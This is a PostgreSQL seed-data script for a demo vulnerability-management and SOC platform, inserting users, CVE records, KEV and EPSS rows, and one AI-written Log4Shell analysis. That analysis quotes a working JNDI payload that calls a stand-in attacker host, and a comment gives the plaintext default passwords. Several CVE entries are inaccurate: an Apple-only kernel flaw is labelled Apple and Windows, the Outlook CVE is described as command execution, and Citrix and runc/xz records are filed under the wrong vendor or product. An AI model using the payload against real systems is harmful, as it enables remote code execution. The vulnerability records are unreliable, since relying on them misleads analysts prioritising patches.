-- AI Cybersecurity Threat Intelligence & SOC Automation Platform (v2.0)
-- Database Seed Data (PostgreSQL)

-- 1. Seed Organizations
INSERT INTO organizations (id, name) VALUES
(1, 'Microsoft'),
(2, 'Amazon'),
(3, 'Infosys'),
(4, 'TCS'),
(5, 'Deloitte');

SELECT setval('organizations_id_seq', (SELECT MAX(id) FROM organizations));

-- 2. Seed Users (passwords: admin123, analyst123, manager123, viewer123)
INSERT INTO users (organization_id, username, email, hashed_password, role, is_active) VALUES
(1, 'admin', 'admin@microsoft.local', '$2b$12$yHc0qbo9AoBSAK8nRCZsQO.pjND4y4l3EiTidWcLjLVZ78jCP8ppS', 'Admin', TRUE),
(1, 'analyst', 'analyst@microsoft.local', '$2b$12$1ENznFGBYjVJ.p51AtVXiuFDrbDL.pPulrYKv2.OBObyh07OeTW1i', 'Analyst', TRUE),
(1, 'manager', 'manager@microsoft.local', '$2b$12$t/.UTUS8wRZABMK663Gbj.k/bv.HD5lqMXvucNlnAGQLnpfeIVrB.', 'Manager', TRUE),
(1, 'viewer', 'viewer@microsoft.local', '$2b$12$rPwNp2nEXbAp1iji1McpKeNUPoVc42blC7nqheDBbc.Tut0hdCUiO', 'Viewer', TRUE),
(2, 'amazon_analyst', 'analyst@amazon.local', '$2b$12$1ENznFGBYjVJ.p51AtVXiuFDrbDL.pPulrYKv2.OBObyh07OeTW1i', 'Analyst', TRUE),
(2, 'amazon_viewer', 'viewer@amazon.local', '$2b$12$rPwNp2nEXbAp1iji1McpKeNUPoVc42blC7nqheDBbc.Tut0hdCUiO', 'Viewer', TRUE);

-- 3. Seed Vendors
INSERT INTO vendors (id, name) VALUES
(1, 'Microsoft'),
(2, 'Apache'),
(3, 'Cisco'),
(4, 'Linux'),
(5, 'Google');

SELECT setval('vendors_id_seq', (SELECT MAX(id) FROM vendors));

-- 4. Seed Products
INSERT INTO products (id, vendor_id, name) VALUES
(1, 1, 'Windows Server'),
(2, 1, 'Active Directory'),
(3, 2, 'HTTP Server'),
(4, 2, 'Log4j'),
(5, 3, 'IOS'),
(6, 4, 'Linux Kernel'),
(7, 5, 'Chrome');

SELECT setval('products_id_seq', (SELECT MAX(id) FROM products));

-- 5. Seed Vulnerabilities (Mapped to Org 1 and Org 2)
INSERT INTO vulnerabilities (cve_id, organization_id, title, description, cvss_score, cvss_vector, severity, published_date, last_modified_date, vendor_id, product_id) VALUES
-- Organization 1: Microsoft
('CVE-2021-44228', 1,
 'Apache Log4j Remote Code Execution (Log4Shell)', 
 'Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.', 
 10.0, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'CRITICAL', '2021-12-10 00:00:00+00', '2021-12-24 00:00:00+00', 2, 4),

('CVE-2023-38606', 1,
 'Apple & Windows Kernel Memory Corruption Vulnerability', 
 'A memory corruption issue was addressed with improved state management. This vulnerability allows an attacker with kernel privileges to bypass security restrictions and access sensitive parts of the operating system memory, enabling persistent exploitation.', 
 7.8, 'CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H', 'HIGH', '2023-07-24 00:00:00+00', '2023-08-15 00:00:00+00', 1, 1),

('CVE-2023-23397', 1,
 'Microsoft Outlook Elevation of Privilege Vulnerability', 
 'A privilege escalation vulnerability exists in Microsoft Outlook when it processes a specially crafted email message. An attacker who successfully exploited this vulnerability could execute commands on the victim''s system without user intervention.', 
 9.8, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'CRITICAL', '2023-03-14 00:00:00+00', '2023-04-10 00:00:00+00', 1, 1),

('CVE-2024-38077', 1,
 'Windows Remote Access Connection Manager Remote Code Execution', 
 'A remote code execution vulnerability exists in the Windows Remote Access Connection Manager (RASMAN). An unauthenticated attacker could exploit this vulnerability by sending specially crafted connection requests, leading to system takeover.', 
 9.8, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'CRITICAL', '2024-07-09 00:00:00+00', '2024-07-12 00:00:00+00', 1, 1),

-- Organization 2: Amazon
('CVE-2023-4863', 2,
 'Google Chrome Heap Buffer Overflow in WebP', 
 'Heap buffer overflow in WebP in Google Chrome prior to 116.0.5845.187 allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page. This vulnerability has been widely exploited in the wild.', 
 8.8, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H', 'HIGH', '2023-09-12 00:00:00+00', '2023-09-20 00:00:00+00', 5, 7),

('CVE-2024-21626', 2,
 'Linux runc Container Escape Vulnerability', 
 'runc is a CLI tool for spawning and running containers on Linux according to the OCI specification. In runc 1.1.11 and earlier, an attacker could exploit a file descriptor leak to achieve host namespace containment escape, enabling full host access from a container.', 
 8.6, 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', 'HIGH', '2024-01-31 00:00:00+00', '2024-02-10 00:00:00+00', 4, 6),

('CVE-2024-3094', 2,
 'XZ Utils Backdoor Vulnerability', 
 'Malicious code was discovered in upstream tarballs of xz, starting with version 5.6.0. Through a series of complex obfuscated stages, the liblzma build process extracts a prebuilt object file, which modifies the sshd decryption capabilities, allowing unauthorized remote execution.', 
 10.0, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'CRITICAL', '2024-03-29 00:00:00+00', '2024-04-02 00:00:00+00', 4, 6),

('CVE-2023-4966', 2,
 'Citrix NetScaler ADC and Gateway Session Hijacking (Citrix Bleed)', 
 'Citrix NetScaler ADC and NetScaler Gateway contain a buffer overflow vulnerability that allows sensitive information disclosure, specifically session tokens. These tokens can be used to bypass multi-factor authentication (MFA).', 
 9.4, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', 'CRITICAL', '2023-10-10 00:00:00+00', '2023-11-01 00:00:00+00', 3, 5);

-- 6. Seed CISA KEV
INSERT INTO cisa_kev (cve_id, date_added, due_date, action_required, short_description) VALUES
('CVE-2021-44228', '2021-12-10', '2021-12-24', 'Apply updates per vendor instructions.', 'Apache Log4j2 JNDI message lookup vulnerability allows remote code execution.'),
('CVE-2023-38606', '2023-08-01', '2023-08-22', 'Apply updates per vendor instructions.', 'Apple and Windows kernel memory corruption vulnerability allows privilege escalation.'),
('CVE-2023-23397', '2023-03-14', '2023-04-04', 'Apply updates per vendor instructions.', 'Microsoft Outlook privilege escalation vulnerability allows credentials theft without user action.'),
('CVE-2023-4966', '2023-10-18', '2023-11-08', 'Apply updates per vendor instructions.', 'Citrix NetScaler ADC and Gateway session hijacking vulnerability allowing MFA bypass.');

-- 7. Seed EPSS Scores
INSERT INTO epss (cve_id, score, percentile) VALUES
('CVE-2021-44228', 0.97341, 0.99951),
('CVE-2023-38606', 0.81230, 0.98450),
('CVE-2023-23397', 0.94122, 0.99120),
('CVE-2023-4863', 0.92345, 0.98990),
('CVE-2024-21626', 0.72311, 0.95420),
('CVE-2024-38077', 0.88410, 0.97850),
('CVE-2024-3094', 0.96102, 0.99841),
('CVE-2023-4966', 0.95431, 0.99540);

-- 8. Seed AI Vulnerability Analysis Reports
INSERT INTO ai_analysis (cve_id, organization_id, executive_summary, technical_analysis, risk_impact, recommendations, patch_priority, generated_by) VALUES
('CVE-2021-44228', 1,
 'The Log4Shell vulnerability in Apache Log4j represents one of the most critical enterprise threats of the decade. Due to its ubiquity in Java enterprise systems, remote unauthenticated code execution is easily accomplished. Immediate remediation is required to prevent widespread compromise.', 
 'The vulnerability exists in the LDAP JNDI implementation of log4j-core. When log4j logs a string containing the JNDI lookup syntax `${jndi:ldap://attacker.com/a}`, the JNDI parser queries the attacker''s server and downloads/executes a serialized Java class. This allows remote code execution at the privilege level of the Java process.', 
 'High likelihood of exploitation. Compromise leads to full control over host resources, data exfiltration, lateral movement, and deployment of ransomware. Score: 10/10 CVSS.', 
 '1. Upgrade Apache Log4j to 2.17.1 or higher.\n2. In environments where patching is delayed, set system property `log4j2.formatMsgNoLookups=true`.\n3. Implement egress network filters to block LDAP/RMI connections from production subnets to the internet.', 
 'IMMEDIATE', 1);

-- 9. Seed Workflow Logs
INSERT INTO workflow_logs (organization_id, source, action_type, status, details) VALUES
(1, 'NVD Collector', 'Fetch Feed', 'SUCCESS', 'Retrieved latest Microsoft vulnerabilities. Ingested 4 items.'),
(2, 'NVD Collector', 'Fetch Feed', 'SUCCESS', 'Retrieved latest Amazon vulnerabilities. Ingested 4 items.');

-- 10. Seed Audit Logs
INSERT INTO audit_logs (organization_id, user_id, action, resource, details, ip_address) VALUES
(1, 1, 'USER_LOGIN', 'users/login', 'User admin logged in successfully.', '192.168.1.100'),
(2, 5, 'USER_LOGIN', 'users/login', 'User amazon_analyst logged in.', '192.168.1.200');
